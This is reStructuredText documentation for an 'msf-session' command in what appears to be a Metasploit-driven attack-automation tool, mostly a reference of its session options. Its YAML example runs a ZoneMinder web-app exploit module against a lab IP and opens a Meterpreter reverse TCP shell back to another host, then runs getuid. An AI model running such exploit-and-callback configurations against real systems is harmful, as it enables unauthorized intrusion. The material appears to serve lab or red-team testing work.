.. _msf-session:

===========
msf-session
===========

This command allows to read and write commands to (Meterpreter)sessions that
have previously created by msf-modules(see :ref:`msf-module`).

.. code-block:: yaml

      commands:
        - type: msf-module
           cmd: exploit/unix/webapp/zoneminder_snapshots
           creates_session: "foothold"
           options:
             RHOSTS: 192.42.0.254
           payload_options:
             LHOST: 192.42.2.253
           payload: cmd/unix/python/meterpreter/reverse_tcp

        - type: msf-session
          session: "foothold"
          stdapi: True
          cmd: getuid

.. note::

   To configure the connection to the msfrpc-server see :ref:`msf_config`

.. confval:: stdapi

   Load stdapi module in the Meterpreter-session.

   :type: bool
   :default: ``False``

.. confval:: write

   Execute a raw write-operation without reading the output.

   .. note::

      If read and write are both true, the programm will first write and then read.

   :type: bool
   :default: ``False``

.. confval:: read

   Execute a raw read-operation without a write-operation.

   :type: bool
   :default: ``False``

.. confval:: session

   Use this session for all operations.

   :type: str
   :required: True

.. confval:: end_str

   This string indicated the end of a read-operation.

   :type: str
